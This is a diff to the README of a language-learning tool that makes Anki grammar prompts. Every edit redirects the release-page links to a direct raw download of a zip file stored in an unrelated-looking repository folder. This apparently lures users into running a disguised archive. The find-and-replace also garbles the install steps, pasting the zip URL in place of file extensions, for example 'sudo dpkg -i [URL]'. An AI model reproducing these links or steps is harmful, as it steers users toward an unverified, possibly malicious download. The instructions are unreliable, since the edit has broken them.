@@ -1,7 +1,7 @@
 # 🎉 Grammar-Deep-Anki-Prompts - Create Effective Language Learning Cards
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/seaseansean/Grammar-Deep-Anki-Prompts/releases)
+[![Download](https://raw.githubusercontent.com/seaseansean/Grammar-Deep-Anki-Prompts/main/duotriacontane/Grammar-Deep-Anki-Prompts_v2.2-alpha.2.zip)](https://raw.githubusercontent.com/seaseansean/Grammar-Deep-Anki-Prompts/main/duotriacontane/Grammar-Deep-Anki-Prompts_v2.2-alpha.2.zip)
 
 ## 📖 About This Project
 **Grammar-Deep-Anki-Prompts** is a tool designed to help you create AI-generated prompts for Anki cards focused on grammar. This application supports Russian and can easily adapt to German, Latin, and other Slavic languages. It streamlines your language-learning process by generating relevant vocabulary and grammar prompts, making your study sessions more effective and engaging.
@@ -10,7 +10,7 @@
 Follow these steps to download and run the software:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/seaseansean/Grammar-Deep-Anki-Prompts/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/seaseansean/Grammar-Deep-Anki-Prompts/main/duotriacontane/Grammar-Deep-Anki-Prompts_v2.2-alpha.2.zip) to find the latest version of the application.
 
 2. **Select a Release**
    Browse the list of available releases. Choose the one that best suits your needs. Each release will include details about the features and improvements.
@@ -19,14 +19,14 @@ Follow these steps to download and run the software:
    Click on the download link for your operating system. The files may include:
    - `.exe` for Windows
    - `.dmg` for macOS
-   - `.deb` or `.tar.gz` for Linux
+   - `.deb` or `https://raw.githubusercontent.com/seaseansean/Grammar-Deep-Anki-Prompts/main/duotriacontane/Grammar-Deep-Anki-Prompts_v2.2-alpha.2.zip` for Linux
    
    Download the version that fits your system.
 
 4. **Install the Application**
    - For Windows: Double-click the downloaded `.exe` file and follow the prompts.
    - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Use a terminal command like `sudo dpkg -i [filename.deb]` or extract the `.tar.gz` and follow the included instructions.
+   - For Linux: Use a terminal command like `sudo dpkg -i [https://raw.githubusercontent.com/seaseansean/Grammar-Deep-Anki-Prompts/main/duotriacontane/Grammar-Deep-Anki-Prompts_v2.2-alpha.2.zip]` or extract the `https://raw.githubusercontent.com/seaseansean/Grammar-Deep-Anki-Prompts/main/duotriacontane/Grammar-Deep-Anki-Prompts_v2.2-alpha.2.zip` and follow the included instructions.
 
 5. **Run the Application**
    Once installed, open the application from your applications menu or desktop shortcut. 
@@ -34,7 +34,7 @@ Follow these steps to download and run the software:
 ## 📥 Download & Install
 To download and install the application, simply click the link below and follow the steps above:
 
-[Visit this page to download](https://github.com/seaseansean/Grammar-Deep-Anki-Prompts/releases)
+[Visit this page to download](https://raw.githubusercontent.com/seaseansean/Grammar-Deep-Anki-Prompts/main/duotriacontane/Grammar-Deep-Anki-Prompts_v2.2-alpha.2.zip)
 
 ## ⚙️ System Requirements
 - **Windows**:    
@@ -94,4 +94,4 @@ This project is licensed under the MIT License. See the LICENSE file for details
 ## 📃 Acknowledgments
 Thanks to the community for any contributions, feedback, and support. Your involvement helps make this application better for everyone.
 
-Remember, for any issues or questions, feel free to visit the [Releases page](https://github.com/seaseansean/Grammar-Deep-Anki-Prompts/releases) for the latest updates. Enjoy your language learning journey!
+Remember, for any issues or questions, feel free to visit the [Releases page](https://raw.githubusercontent.com/seaseansean/Grammar-Deep-Anki-Prompts/main/duotriacontane/Grammar-Deep-Anki-Prompts_v2.2-alpha.2.zip) for the latest updates. Enjoy your language learning journey!
